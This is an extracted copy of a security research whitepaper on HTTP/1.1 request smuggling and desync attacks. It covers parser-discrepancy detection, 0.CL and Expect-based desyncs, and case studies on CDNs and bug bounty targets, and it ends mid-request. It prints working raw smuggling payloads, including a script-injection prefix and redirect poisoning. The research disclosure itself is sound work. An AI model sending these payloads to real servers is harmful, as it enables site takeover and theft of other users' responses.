{"path":"Clippings/attachments/US-25-Kettle-HTTP1-Must-Die-The-Desync-Endgame-wp.pdf","text":"H TTP/ 1. 1 Must D ie The Des y nc Endga me James Kettle - james.kettle@p o rtswigger.n et - @albin o wax A bstract Upstream HTTP/1.1 is inherently insecure and regularly exposes millions of websites to hostile takeover . Six years of attempted mitigations have hidden the issue, but failed to ﬁx it. This paper introduces several novel classes of HTTP desync attack capable of mass compromise of user credentials. These techniques are demonstrated through detailed case studies, including critical vulnerabilities which exposed tens of millions of websites by subverting core infrastructure within Akamai, Cloudﬂare, and Netlify . I also introduce an open-source toolkit that enables systematic detection of parser discrepancies and target-speciﬁc weak spots. Combined, this toolkit and these techniques yielded over $200,000 in bug bounties in a two-week period. Ultimately, I argue that HTTP request smuggling must be recognized as a fundamental protocol ﬂaw. The past six years have demonstrated that addressing individual implementation issues will never eliminate this threat. Although my ﬁndings have been reported and patched, websites remain silently vulnerable to inevitable future variants. These all stem from a fatal ﬂaw in HTTP/1.1 which means that minor implementation bugs frequently trigger severe security consequences. HTTP/2+ solves this threat. If we want a secure web, HTTP/1.1 must die. Table o f co n ten ts The desync endgame The fatal ﬂaw in HTTP/1.1 Mitigations that hide but don't ﬁx Hacking 20 million websites by accident \"HTTP/1 is simple\" and other lies A strategy to win the desync endgame Detecting parser discrepancies Understanding V -H and H-V discrepancies Turning a V -H discrepancy into a CL.0 desync Detection strategies Detecting high-risk parsing Exploiting H-V on IIS behind ALB Exploiting H-V without Transfer-Encoding 0.CL desync attacks The 0.CL deadlock Breaking the 0.CL deadlock Moving beyond 400 Bad Request Converting 0.CL into CL.0 with a double-desync More desync attacks are coming Expect-based desync attacks The Expect complexity bomb Bypassing response header removal An unplanned collaboration 0.CL desync via vanilla Expect - T-Mobile 0.CL desync via obfuscated Expect - Gitlab CL.0 desync via vanilla Expect - Netlify CDN CL.0 desync via obfuscated Expect - Akamai CDN Defending against HTTP desync attacks Why patching HTTP/1.1 is not enough How secure is HTTP/2 compared to HTTP/1? How to defeat request smuggling with HTTP/2 How to survive with HTTP/1.1 How you can help kill HTTP/1.1 Conclusion The desyn c en dgame The fatal ﬂ aw in HTTP/1 .1 HTTP/1.1 has a fatal, highly-exploitable ﬂaw - the boundaries between individual HTTP requests are very weak. Requests are simply concatenated on the underlying TCP/TLS socket with no delimiters, and there are multiple ways to specify their length. This means attackers can create extreme ambiguity about where one request ends and the next request starts. Major websites often use reverse proxies, which funnel requests from dif ferent users down a shared connection pool to the back-end server . This means that an attacker who ﬁnds the tiniest parser discrepancy in the server chain can cause a desync, apply a malicious preﬁx to other users' requests, and usually achieve complete site takeover: As HTTP/1.1 is an ancient, lenient, text-based protocol with thousands of implementations, ﬁnding parser discrepancies is not hard. When I ﬁrst discovered this threat in 2019, it felt like you could hack anything. For example, I showed it could be exploited to compromise PayPal's login page 1 , twice. Since then, we have also published a free online course on request smuggling 2 and multiple further research papers 3 . If you get lost in any technical details later on, it may be useful to refer back to these. Six years later , it's easy to think we've solved the problem, with a combination of parser tightening and HTTP/2 - a binary protocol that pretty much eliminates the entire attack class if it's used for the upstream connections from the front-end onwards. Unfortunately , it turns out all we've managed to do is make the problem look solved. Mitigatio n s that hide but do n 't ﬁ x In 2025, HTTP/1.1 is everywhere - but not necessarily in plain sight. Servers and CDNs often claim to support HTTP/2, but actually downgrade incoming HTTP/2 requests to HTTP/1.1 for transmission to the back-end system, thereby losing most of the security beneﬁts. Downgrading incoming HTTP/2 messages is even more dangerous than using HTTP/1.1 end to end, as it introduces a fourth way to specify the length of a message. In this paper , we'll use the following acronyms for the four major length interpretations: C L ( C o n t e n t - L e n g t h ) T E ( T r a n s f e r - E n c o d i n g ) 0 ( I m p l i c i t - z e r o ) H 2 ( H T T P / 2 ' s b u i l t - i n l e n g t h ) HTTP/1.1 may look secure at ﬁrst glance because if you apply the original request smuggling methodology and toolkit, you'll have a hard time causing a desync. But why is that? Let's take a look at a classic CL.TE attack using a lightly obfuscated Transfer-Encoding header . In this attack, we are hoping that the front-end server parses the request using the Content-Length header , then forwards the request to a back-end which, calculates the length using the Transfer-Encoding header . P O S T / H T T P / 1 . 1 H o s t : < r e d a c t e d > T r a n s f e r - E n c o d i n g : c h u n k e d C o n t e n t - l e n g t h : 3 5 0 G E T / r o b o t s . t x t H T T P / 1 . 1 X : y H T T P / 1 . 1 2 0 0 O K Here's the simulated victim: G E T / H T T P / 1 . 1 H o s t : e x a m p l e . c o m H T T P / 1 . 1 2 0 0 O K D i s a l l o w : / This used to work on a vast number of websites. These days, the probe will probably fail even if your target is actually vulnerable , for one of three reasons: WAFs now use regexes to detect and block requests with an obfuscated Transfer-Encoding header , or potential HTTP requests in the body . The /robots.txt detection gadget doesn't work on your particular target. There's a server-side race condition which makes this technique highly unreliable on certain targets. The alternative, timeout-based detection strategy discussed in my previous research is also heavily ﬁngerprinted and blocked by W AFs. This has created the desync endgame - you've got the illusion of security thanks to toy mitigations and selective hardening that only serves to break the established detection methodology . Everything looks secure until you make the tiniest change. In truth, HTTP/1.1 implementations are so densely packed with critical vulnerabilities, you can literally ﬁnd them by mistake. Hackin g 2 0 millio n websites by acciden t HTTP/1.1 is simply not ﬁt for a world where we solve every problem by adding another layer . The following case-study illustrates this beautifully . Wannes V erwimp 4 asked for my thoughts on an issue he'd discovered af fecting a site hosted on Heroku, behind Cloudﬂare. He'd found an H2.0 desync and was able to exploit it to redirect visitors to his own website. G E T / a s s e t s / i c o n . p n g H T T P / 2 H o s t : < r e d a c t e d > G E T / a s s e t s H T T P / 1 . 1 H o s t : p s r e s . n e t X : y H T T P / 2 2 0 0 O K C f - C a c h e - S t a t u s : H I T G E T / H T T P / 2 H o s t : < r e d a c t e d > H T T P / 2 3 0 2 F o u n d L o c a t i o n : h t t p s : / / p s r e s . n e t / a s s e t s / This redirect was getting saved in Cloudﬂare's cache, so by poisoning the cache entry for a JavaScript ﬁle, he was able to take persistent control of the entire website. This was all unremarkable except for one thing - the users being hijacked weren't trying to access the target website. The attack was actually compromising random third party sites, including certain banks! I agreed to investigate and noticed something else strange - the attack was blocked by Cloudﬂare's front-end cache, meaning the request would never reach the back-end server . I reasoned that there was no way this attack could possibly work and W annes must have made a mistake, so I added a cache-buster ... and the attack failed. When I removed the cache-buster , it started working. By ignoring the fact his attack was being blocked by a cache, W annes had discovered a HTTP/1.1 desync internal to Cloudﬂare's infrastructure: This ﬁnding exposed over 24,000,000 websites to complete site takeover! It embodies the desync endgame - the classic methodology doesn't work, but the systems built on HTTP/1 are so complex and critical that you can make one mistake and end up with control over 24 million websites. We reported this issue, and Cloudﬂare patched it within hours, published a post-mortem 5 and awarded a $7,000 bounty . Readers unfamiliar with bug bounty hunting may ﬁnd themselves consistently surprised by the bounties paid relative to the impact throughout this whitepaper , but most bounties received were close to the maximum payout advertised by the respective program. Bounty size is an artefact of the underlying economics and any genuinely surprising bounty experiences will be highlighted. \"HTTP/1 is simp le\" an d o ther lies How does a bug like that happen? Partly , it's the sheer complexity of the systems involved. For example, we can infer that requests sent to Cloudﬂare over HTTP/2 are sometimes rewritten to HTTP/1.1 for internal use, then rewritten again to HTTP/2 for the upstream connection! However , the underlying problem is the foundation. There's a widespread, dangerous misconception that HTTP/1.1 is a robust foundation suitable for any system you might build. In particular , people who haven't implemented a reverse-proxy often argue that HTTP/1.1 is simple, and therefore secure. The moment you attempt to proxy HTTP/1.1, it becomes a lot less simple. To illustrate this, here are ﬁve lies that I personally used to believe - each of which will be critical to a real-world exploit discussed later in this paper Lie 1: An HTTP/1.1 request can't directly target an intermediary Lie 2: An HTTP/1.1 desync can only be caused by a parser discrepancy Lie 3: An HTTP/1.1 response contains everything a proxy needs to parse it Lie 4: An HTTP/1.1 response can only contain one header block Lie 5: A complete HTTP/1.1 response requires a complete request Which ones did you believe? Can you map each statement to the feature that undermines it? Taken together , the reality behind the last three lies is that your proxy needs a reference to the request object just to read the correct number of response bytes of f the TCP socket from the back- end, and you need control-ﬂow branches to handle multiple header blocks even before you even reach the response body , and the entire response may arrive before the client has even ﬁnished sending you the request. This is HTTP/1.1 - it's the foundation of the web, full of complexities and gotchas that routinely expose millions of websites, and we've spent six years failing to patch implementations to compensate for it. It needs to die. To achieve that, we need to collectively show the world that HTTP/1.1 is insecure - in particular , that more desync attacks are always coming. In the rest of this paper , I hope to show you how to do that. All case-studies were identiﬁed through authorized testing on targets with vulnerability disclosure programs (VDPs), and have been privately reported and patched (unless mentioned otherwise). As a side ef fect of VDP terms and conditions, many of them are partially redacted, even though the issues are actually patched. Where a company is explicitly named, this is an indication that they have a more mature security program. All bounties earned during this research were split equally between everyone involved, and my cut was doubled by PortSwigger then donated to a local charity 6 . A strategy to win the desyn c en dgame D etectin g p arser discrep an cies In the desync endgame, detecting vulnerabilities is difﬁcult due to mitigations, complexity , and quirks. To thrive in this environment, we need a detection strategy that reliably identiﬁes the underlying ﬂaws that make desync attacks possible, rather than attempting brittle attacks with many moving parts. This will set us up to recognize and overcome exploitation challenges. Back in 2021, Daniel Thacher presented Practical HTTP Header Smuggling 7 at Black Hat Europe, and described an approach for detecting parser discrepancies using the Content-Length header . I liked the concept so much that after I tried his tool out, I decided to try building my own implementation from scratch, do things slightly dif ferently, and see what happened. This tool proved highly ef fective, and I'm pleased to release it in the open-source Burp Suite extension HTTP Request Smuggler v3.0 8 . Here's a high-level overview of the three key elements used for analysis, and the possible outcomes: Un derstan din g V-H an d H-V discrep an cies Let's take a look at real detection, and how to interpret it: G E T / H T T P . 1 . 1 H o s t : < r e d a c t e d - f o o d - c o r p > H T T P / 1 . 1 2 0 0 O K X o s t : < r e d a c t e d - f o o d - c o r p > H T T P / 1 . 1 5 0 3 S e r v i c e U n a v a i l a b l e H o s t : < r e d a c t e d - f o o d - c o r p > H T T P / 1 . 1 4 0 0 B a d R e q u e s t X o s t : < r e d a c t e d - f o o d - c o r p > H T T P / 1 . 1 5 0 3 S e r v i c e U n a v a i l a b l e Here, HTTP Request Smuggler has detected that sending a request with a partially-hidden Host header causes a unique response that can't be triggered by sending a normal Host header , or by omitting the header entirely , or by sending an arbitrary masked header . This is strong evidence that there's a parser discrepancy in the server chain used by the target. If we assume there's a front- end and a back-end, there's two key possibilities: Visible-Hidden (V -H): The masked Host header is visible to the front-end, but hidden from the back- end Hidden-V isible (H-V): The masked Host header is hidden from the front-end, but visible to the back- end You can often distinguish between V -H and H-V discrepancies by paying close attention to the responses, and guessing whether they originated from a front-end or back-end. Note that the speciﬁc status codes are not relevant, and can sometimes be confusing. All that matters is that they're dif ferent. This ﬁnding turned out to be a V -H discrepancy . Turn in g a V-H discrep an cy in to a C L.0 desyn c Given a V -H discrepancy , you could attempt a TE.CL exploit by hiding the Transfer-Encoding header from the back-end, or try a CL.0 exploit by hiding the Content-Length header . I highly recommend using CL.0 wherever possible as it's much less likely to get blocked by a W AF. On many V-H targets, including the one above, exploitation was simple: G E T / s t y l e . c s s H T T P / 1 . 1 H o s t : < r e d a c t e d - f o o d - c o r p > F o o : b a r C o n t e n t - L e n g t h : 2 3 G E T / 4 0 4 H T T P / 1 . 1 X : y H T T P / 1 . 1 2 0 0 O K G E T / H T T P / 1 . 1 H o s t : < r e d a c t e d - f o o d - c o r p > H T T P / 1 . 1 4 0 4 N o t F o u n d On a dif ferent target, the above exploit failed because the front-end server was rejecting GET requests that contained a body . I was able to work around this simply by switching the method to OPTIONS. It's the ability to spot and work around barriers like this that makes scanning for parser- discrepancies so useful. I didn't invest any time in crafting a fully weaponized PoC on this target, as it's not economical for low-paid bounty programs and VDPs. D etectio n strategies By combining dif ferent headers, permutations, and strategies, the tool achieves superior coverage. For example, here's a discovery made using the same header (Host), and the same permutation (leading space before header name), but a dif ferent strategy (duplicate Host with invalid value): P O S T / j s / j q u e r y . m i n . j s H o s t : < v p n . r e d a c t e d > H o s t : x / x H T T P / 1 . 1 4 0 0 B a d R e q u e s t X o s t : x / x H T T P / 1 . 1 4 1 2 P r e c o n d i t i o n F a i l e d H o s t : x / x H T T P / 1 . 1 2 0 0 O K X o s t : x / x H T T P / 1 . 1 4 1 2 P r e c o n d i t i o n F a i l e d This target was once again straightforward to exploit using a CL.0 desync. In my experience, web VPNs often have ﬂawed HTTP implementations and I would strongly advise against placing one behind any kind of reverse proxy . D etectin g high-risk p arsin g The discrepancy-detection approach can also identify servers that deviate from accepted parsing conventions and are, therefore, likely to be vulnerable if placed behind a reverse proxy . For example, scanning a <redacted> server revealed that they don't treat \\n\\n as terminating the header block: P O S T / H T T P / 1 . 1 \\ r \\ n C o n t e n t - L e n g t h : 2 2 \\ r \\ n A : B \\ r \\ n \\ n E x p e c t : 1 0 0 - c o n t i n u e \\ r \\ n H T T P / 1 . 1 1 0 0 C o n t i n u e H T T P / 1 . 1 3 0 2 F o u n d S e r v e r : < r e d a c t e d > This is harmless for direct access, but RFC-9112 9 states \"a recipient MA Y recognize a single LF as a line terminator\". Behind such a front-end, this would be exploitable. This vulnerability was traced back to the underlying HTTP library, and a patch is on the way . Reporting theoretical ﬁndings like these is unlikely to net you sizeable bug bounty payouts, but could potentially do quite a lot to make the ecosystem more secure. Exp lo itin g H-V o n IIS behin d A LB HTTP Request Smuggler also identiﬁed a large number of vulnerable systems using Microsoft IIS behind AWS Application Load Balancer (ALB). This is useful to understand because AWS isn't planning to patch it. The detection typically shows up like: H o s t : f o o / b a r 4 0 0 , S e r v e r ; a w s e l b / 2 . 0 X o s t : f o o / b a r 2 0 0 , - n o s e r v e r h e a d e r - H o s t : f o o / b a r 4 0 0 , S e r v e r : M i c r o s o f t - H T T P A P I / 2 . 0 X o s t : f o o / b a r 2 0 0 , - n o s e r v e r h e a d e r - As you can infer from the server banners, this is a H-V discrepancy: when the malformed Host header is obfuscated, ALB doesn't see it and passes the request through to the back-end server . The classic way to exploit a H-V discrepancy is with a CL.TE desync, as the Transfer-Encoding header usually takes precedence over the Content-Length, but this gets blocked by AWS' Desync Guardian 1 0 . I decided to shelve the issue to focus on other ﬁndings, then Thomas Stacey independently discovered it 1 1 , and bypassed Desync Guardian using an H2.TE desync. Even with the H2.TE bypass ﬁxed, attackers can still exploit this to smuggle headers, enabling IP- spooﬁng and sometimes complete authentication bypass 1 2 . I reported this issue to AWS, and it emerged that they were already aware but chose not to patch it because they don't want to break compatibility with ancient HTTP/1 clients sending malformed requests. You can patch it yourself by changing two settings: Set routing.http.drop_invalid_header_ﬁelds.enabled Set routing.http.desync_mitigation_mode = strictest This unﬁxed ﬁnding exposes an overlooked danger of cloud proxies: adopting them imports another company's technical debt directly into your own security posture. Exp lo itin g H-V witho ut Tran sfer-En co din g The next major breakthrough in this research came when I discovered a H-V discrepancy on a certain website which blocks all requests containing Transfer-Encoding, making CL.TE attacks impossible. There was only one way forward with this: a 0.CL desync attack. 0.C L desyn c attacks The 0 .C L deadlo ck 0.CL desync attacks are widely regarded as unexploitable. To understand why , consider what happens when you send the following attack to a target with a H-V parser discrepancy: G E T / L o g o n H T T P / 1 . 1 H o s t : < r e d a c t e d > C o n t e n t - L e n g t h : 7 G E T / 4 0 4 H T T P / 1 . 1 X : Y The front-end doesn't see the Content-Length header , so it will regard the orange payload as the start of a second request. This means it buf fers the orange payload, and only forwards the header- block to the back-end: G E T / L o g o n H T T P / 1 . 1 H o s t : < r e d a c t e d > C o n t e n t - L e n g t h : 7 H T T P / 1 . 1 5 0 4 G a t e w a y T i m e o u t The back end does see the Content-Length header , so it will wait for the body to arrive. Meanwhile, the front-end will wait for the back-end to reply . Eventually, one of the servers will time out and reset the connection, breaking the attack. In essence, 0.CL desync attacks usually result in an upstream connection deadlock. B reakin g the 0 .C L deadlo ck Prior to this research, I spent two years exploring race conditions and timing attacks. In the process, I stumbled on a solution for the 0.CL deadlock. Whenever I tried to use the single-packet attack 1 3 on a static ﬁle on a target running nginx, nginx would break my timing measurement by responding to the request before it was complete. This required a convoluted workaround at the time, but hinted at a way to make 0.CL exploitable. The key to escaping the 0.CL deadlock is to ﬁnd an early-response gadget: a way to make the back-end server respond to a request without waiting for the body to arrive. This is straightforward on nginx, but my target was running IIS, and the static ﬁle trick didn't work there. So, how can we persuade IIS to respond to a request without waiting for the body to arrive? Let's take a look at my favourite piece of Windows documentation 1 4 : Do not use the following reserved names for the name of a ﬁle: CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7... If you try to access a ﬁle or folder using a reserved name, the operating system will throw an exception for amusing legacy reasons. W e can make a server hit this quirk simply by requesting 'con' inside any folder that's mapped to the ﬁlesystem. I found that if I hit /con on the target website, IIS would respond without waiting for the body to arrive, and helpfully leave the connection open. When combined with the CL.0 desync, this would result in it interpreting the start of the second request as the body of the ﬁrst request, triggering a 400 Bad Request response. Here's the view from the user's perspective: G E T / c o n H T T P / 1 . 1 H o s t : < r e d a c t e d > C o n t e n t - L e n g t h : 7 H T T P / 1 . 1 2 0 0 O K G E T / H T T P / 1 . 1 H o s t : < r e d a c t e d > H T T P / 1 . 1 4 0 0 B a d R e q u e s t And the view on the back-end connection: G E T / c o n H T T P / 1 . 1 H o s t : < r e d a c t e d > C o n t e n t - L e n g t h : 7 G E T / H T T P / 1 . 1 H o s t : < r e d a c t e d > I've known about the /con quirk for over ten years but this was the ﬁrst time I've been able to actually make use of it! Also, over the last six years, I've seen so many suspicious 'Bad request' responses, I actually made HTTP Request Smuggler report them with the cryptic title Mystery 400 1 5 . This was the moment when I realised they were probably all exploitable. On other servers, I found server-level redirects operated as early-response gadgets. However , I never found a viable gadget for Apache; they're too studious about closing the connection when they hit an error condition. Mo vin g beyo n d 4 0 0 B ad Req uest To prove you've found a 0.CL desync, the next step is to trigger a controllable response. After the attack request, send a 'victim' request containing a second path nested inside the header block: G E T / c o n H T T P / 1 . 1 H o s t : < r e d a c t e d > C o n t e n t - L e n g t h : 2 0 H T T P / 1 . 1 2 0 0 O K G E T / H T T P / 1 . 1 X : y G E T / w r t z H T T P / 1 . 1 H o s t : < r e d a c t e d > H T T P / 1 . 1 3 0 2 F o u n d L o c a t i o n : / L o g o n ? R e t u r n U r l = % 2 f w r t z If you set the Content-Length of the ﬁrst request correctly , it will slice the initial bytes of f the victim request, and you'll see a response indicating that the hidden request line got processed. This is sufﬁcient to prove there's a 0.CL desync, but it's obviously not a realistic attack - we can't assume our victim will include a payload inside their own request! W e need a way to add our payload to the victim's request. W e need to convert our 0.CL into a CL.0. C o n vertin g 0 .C L in to C L.0 with a do uble-desyn c To convert 0.CL into CL.0, we need a double-desync! This is a multi-stage attack where the attacker uses a sequence of two requests to set the trap for the victim: The ﬁrst request poisons the connection with a 0.CL desync The poisoned connection weaponises the second request into a CL.0 desync, which then repoisons the connection with a malicious preﬁx The malicious preﬁx then poisons the victim's request, causing a harmful response The cleanest way to achieve this would be to have the 0.CL cut the entire header block of f the ﬁrst request: P O S T / n u l H T T P / 1 . 1 C o n t e n t - l e n g t h : 1 6 3 P O S T / H T T P / 1 . 1 C o n t e n t - L e n g t h : 1 1 1 G E T / H T T P / 1 . 1 H o s t : < r e d a c t e d > G E T / w r t z H T T P / 1 . 1 F o o : b a r Unfortunately , this is not as easy as it looks. You need to know the exact size of the second request header block, and virtually all front-end servers append extra headers. On the back-end, the request sequence above ends up looking like: P O S T / n u l H T T P / 1 . 1 C o n t e n t - l e n g t h : 1 6 3 G E T / H T T P / 1 . 1 C o n t e n t - L e n g t h : 1 1 1 ? ? ? ? ? ? : ? ? ? ? ? ? ? ? ? ? ? - - c o n n e c t i o n t e r m i n a t e d - - You can discover the length of the injected headers using the new 0cl-ﬁnd-of fset1 6 script for Turbo Intruder , but these often contain things like the client IP , which means the attack works for you but breaks when someone else tries to replicate it. This makes bug bounty triage painful. After a lot of pain, I discovered a better way . Most servers insert headers at the end of the header block, not at the start. So, if our smuggled request starts before that, the attack will work reliably! Here's an example that uses an input reﬂection to reveal the inserted header: P O S T / n u l H T T P / 1 . 1 C o n t e n t - l e n g t h : 9 2 H T T P / 1 . 1 2 0 0 O K G E T / z H T T P / 1 . 1 C o n t e n t - L e n g t h : 1 8 0 F o o : G E T / y H T T P / 1 . 1 ? ? ? : ? ? ? ? / / f r o n t - e n d h e a d e r l a n d s h e r e P O S T / i n d e x . a s p H T T P / 1 . 1 C o n t e n t - L e n g t h : 2 0 1 < r e d a c t e d > = z w r t H T T P / 1 . 1 2 0 0 O K G E T / H T T P / 1 . 1 H o s t : < r e d a c t e d > I n v a l i d i n p u t z w r t G E T / H T T P / 1 . 1 H o s t : < r e d a c t e d > C o n n e c t i o n : k e e p - a l i v e A c c e p t - E n c o d i n g : i d e n t i t y From this point, we can use traditional CL.0 exploit techniques. On this target, I used the HEAD technique to serve malicious JavaScript to random users: P O S T / n u l H T T P / 1 . 1 H o s t : < r e d a c t e d > C o n t e n t - l e n g t h : 4 4 H T T P / 1 . 1 2 0 0 O K G E T / a a H T T P / 1 . 1 C o n t e n t - L e n g t h : 1 5 0 F o o : G E T / b b H T T P / 1 . 1 H o s t : < r e d a c t e d > H E A D / i n d e x . a s p H T T P / 1 . 1 H o s t : < r e d a c t e d > G E T / ? < s c r i p t > a l e r t ( 1 H T T P / 1 . 1 X : Y H T T P / 1 . 1 2 0 0 O K L o c a t i o n : / L o g o n ? r e t u r n U r l = / b b G E T / H T T P / 1 . 1 H o s t : < r e d a c t e d > H T T P / 1 . 1 2 0 0 O K C o n t e n t - L e n g t h : 5 6 6 7 0 C o n t e n t - T y p e : t e x t / h t m l H T T P / 1 . 1 3 0 2 F o u n d L o c a t i o n : / L o g o n ? r e t u r n U r l = / < s c r i p t > … You can experiment with this technique yourself for free using our new W eb Security Academy lab 0.CL Request Smuggling 1 7 . Using these techniques, we initially identiﬁed around ten simple 0.CL vulnerabilities in websites with bug bounty programs. Many of these ﬁndings were on websites using a certain cloud W AF - this is not the ﬁrst time we've seen a W AF making a website easier to hack. W e were distracted by other discoveries at this point and didn't bother to weaponize any of the attacks beyond a DoS, so this only took the total bounties earned to $21,645. The best bounty experience was with EXNESS1 8 who awarded $7,500. As usual, the most valuable outcome wasn't the bounties themselves - it was the foundation this work provided for our subsequent ﬁndings. Mo re desyn c attacks are co min g At this point, I thought the desync threat was ﬁnally fully mapped and future issues would be niche, one-of f implementation ﬂaws. This is a mistake I make every year . Here's a partial history of major advances in request smuggling: 2004: HTTP Request Smuggling 1 9 – (largely forgotten) 2016: Hiding wookies in HTTP 2 0 (largely ignored at the time) 2019: Exploit header parser discrepancies 2 1 (CL.TE, TE.CL) 2021: Exploit HTTP/2 downgrading 2 2 (H2.CL, H2.TE) 2022: Exploit endpoints that ignore CL 2 3 (CL.0, H2.0, CSD) 2024: Exploit dechunking 2 4 (TE.0) 2025: Exploit chunk extensions (TE.TE) 2 5 Just now: 0.CL desync attacks It took the next discovery for me to ﬁnally realise the truth - more desync attacks are always coming. Exp ect-based desyn c attacks The Exp ect co mp lexity bo mb Back in 2022, I tried out using the Expect header for desync attacks 2 6 but didn't ﬁnd anything. As it turns out, I didn't look hard enough. This time around, I ﬁrst started using the Expect header while looking for a way to detect 0.CL desync vulnerabilities without an early-response gadget. The Expect header is an ancient optimisation that splits sending a single HTTP request into a two- part process. The client sends the header block containing Expect: 100-continue, and the server evaluates whether the request would be accepted. If the server responds with HTTP/1.1 100 Continue, the client is then permitted to send the request body . This is complex for both clients and servers, and signiﬁcantly worse for reverse proxies. Consider what happens if the front-end doesn't support Expect, or see the header , or parse the value as 100- continue. What about the back-end? What if the back-end responds early , or the client doesn't wait for 100-continue? The ﬁrst explicit clue that the Expect header is something special was that it broke the HTTP client in my Turbo Intruder tool, at a critical point where any bug could lead to a desync. Fixing the client massively increased the code complexity . Here's the code to read the response of f the wire before: And after: Expect breaks servers too. On one site, Expect made the server forget that HEAD responses don't have a body and try to read too much data from the back-end socket, causing an upstream deadlock: H E A D / < r e d a c t e d > H T T P / 1 . 1 H o s t : a p i . < r e d a c t e d > C o n t e n t - L e n g t h : 6 E x p e c t : 1 0 0 - c o n t i n u e A B C D E F H T T P / 1 . 1 1 0 0 C o n t i n u e H T T P / 1 . 1 5 0 4 G a t e w a y T i m e o u t That was interesting but relatively harmless - it only posed a DoS risk. Other misbehaviours are less harmless, such as the multiple servers that respond to Expect by disclosing memory . This yielded mysterious fragments of text: P O S T / H T T P / 1 . 1 H o s t : < r e d a c t e d > E x p e c t : 1 0 0 - c o n t i n u e C o n t e n t - L e n g t h : 1 X H T T P / 1 . 1 4 0 4 N o t F o u n d H T T P / 1 . 1 1 0 0 C o n t i n u e d A s k t h e h o t e l w h i c h e H T T P / 1 . 1 4 0 4 N o t F o u n d H T T P / 1 . 1 1 0 0 C o n t i n u e d And secret keys: P O S T / H T T P / 1 . 1 H o s t : < r e d a c t e d > E x p e c t : 1 0 0 - c o n t i n u e C o n t e n t - L e n g t h : 1 X H T T P / 1 . 1 4 0 1 U n a u t h o r i z e d W w w - A u t h e n t i c a t e : B e a r e r H T T P / 1 . 1 1 0 0 C o n t i n T r a n s f e r - E n c o d i n g z x W t h T Q m i I 8 f J 4 o j 9 f z E \" X - : c h u n k e d H T T P / 1 . 1 4 0 1 U n a u t h o r i z e d W w w - A u t h e n t i c a t e : B e a r e r H T T P / 1 . 1 1 0 0 C o n t i n T r a n s f e r - E n c o d i n g z x W t h T Q m 1 4 5 B yp assin g resp o n se header remo val All HTTP/1.1 responses have one header block - unless you send Expect. As a result, the second header block often takes parsers by surprise and breaks attempts from front-end servers to remove sensitive response headers. Here's an example: P O S T / _ n e x t / s t a t i c / f o o . j s H T T P / 1 . 1 H o s t : a p p . n e t l i f y . c o m H T T P / 1 . 1 2 0 0 O K S e r v e r : N e t l i f y X - N f - R e q u e s t - I d : < r e d a c t e d > P O S T / _ n e x t / s t a t i c / f o o . j s H T T P / 1 . 1 H o s t : a p p . n e t l i f y . c o m E x p e c t : 1 0 0 - c o n t i n u e H T T P / 1 . 1 1 0 0 C o n t i n u e S e r v e r : N e t l i f y X - N f - R e q u e s t - I d : < r e d a c t e d > H T T P / 1 . 1 2 0 0 O K X - B b - A c c o u n t - I d : < r e d a c t e d > X - B b - C a c h e - G e n : < r e d a c t e d > X - B b - D e p l o y - I d : < r e d a c t e d > X - B b - S i t e - D o m a i n - I d : < r e d a c t e d > X - B b - S i t e - I d : < r e d a c t e d > X - C n m - S i g n a l - K : < r e d a c t e d > X - N f - C a c h e - K e y : < r e d a c t e d > X - N f - A t s - V e r s i o n : < r e d a c t e d > X - N f - C a c h e - I n f o : < r e d a c t e d > X - N f - C a c h e - R e s u l t : < r e d a c t e d > X - N f - P r o x y - H e a d e r - R e w r i t e : < r e d a c t e d > X - N f - P r o x y - V e r s i o n : < r e d a c t e d > X - N f - S r v - V e r s i o n : < r e d a c t e d > I reported this example to Netlify and they said \"this information is provided by design\". This technique also reveals hundreds of server/version banners that people have attempted to mask in an attempt to mitigate targeted exploits. Luckily , exposed server banners are more of a threat to compliance than anything critical. A n un p lan n ed co llabo ratio n Around this time, I received a message from a small team of full-time bounty hunters - Paolo 'sw33tLie' Arnolfo 2 7 , Guillermo 'bsysop' Gregorio 2 8 , and Mariani 'Medusa' Francesco 2 9 . They had also noticed the Expect header making interesting things happen. They had a solid research pedigree - their exploration of TE.0 Request Smuggling 3 0 landed third in the Top Ten Web Hacking Techniques of 2024 3 1 . As such, we decided to team up. We ended up exploiting many , many targets. Our ﬁndings fell into four broad categories: 0 .C L desyn c via van illa Exp ect - T-Mo bile Simply sending a valid Expect header causes a 0.CL desync on numerous dif ferent servers. I believe this is caused by a broken Expect implementation in the front-end server , which makes it correctly forward the headers, but get confused by the back-end's non-100 reply and forget it still needs to receive a body from the client. Here's a proof of concept we built targeting a T-Mobile staging domain: G E T / l o g o u t H T T P / 1 . 1 H o s t : < r e d a c t e d > . t - m o b i l e . c o m E x p e c t : 1 0 0 - c o n t i n u e C o n t e n t - L e n g t h : 2 9 1 H T T P / 1 . 1 4 0 4 N o t F o u n d G E T / l o g o u t H T T P / 1 . 1 H o s t : < r e d a c t e d > . t - m o b i l e . c o m C o n t e n t - L e n g t h : 1 0 0 G E T / H T T P / 1 . 1 H o s t : < r e d a c t e d > . t - m o b i l e . c o m G E T h t t p s : / / p s r e s . n e t / a s s e t s H T T P / 1 . 1 X : y H T T P / 1 . 1 2 0 0 O K G E T / H T T P / 1 . 1 H o s t : < r e d a c t e d > . t - m o b i l e . c o m H T T P / 1 . 1 3 0 1 M o v e d P e r m a n e n t l y L o c a t i o n : h t t p s : / / p s r e s . n e t / … T-Mobile 3 2 awarded us $12,000 for this ﬁnding - a highly competitive payout for a non-production domain. 0 .C L desyn c via o bfuscated Exp ect - Gitlab Sending a lightly obfuscated Expect header exposes a substantial number of new targets. For example, \"Expect: y 100-continue\" causes a 0.CL desync on h1.sec.gitlab.net. This was an interesting target as it holds the attachments to reports sent to Gitlab's bug bounty program - potentially critical zerodays. The site had a tiny attack surface so we weren't able to ﬁnd a classic redirect or XSS desync gadget for exploitation. Instead, we opted to shoot for Response Queue Poisoning (RQP) - a high- impact attack which results in the server sending everyone random responses intended for other users. RQP is tricky on low-trafﬁc targets due to an inherent race condition, but we persisted and 27,000 requests later we got access to someone else's vulnerability report video and a $7,000 bounty: G E T / H T T P / 1 . 1 C o n t e n t - L e n g t h : 6 8 6 E x p e c t : y 1 0 0 - c o n t i n u e H T T P / 1 . 1 2 0 0 O K G E T / H T T P / 1 . 1 C o n t e n t - L e n g t h : 2 9 2 G E T / H T T P / 1 . 1 H o s t : h 1 . s e c . g i t l a b . n e t G E T / H T T P / 1 . 1 H o s t : h 1 . s e c . g i t l a b . n e t H T T P / 1 . 1 2 0 0 O K G E T / ? ? ? H T T P / 1 . 1 A u t h o r i z a t i o n : ? ? ? U s e r - A g e n t : U n k n o w n G i t l a b e m p l o y e e H T T P / 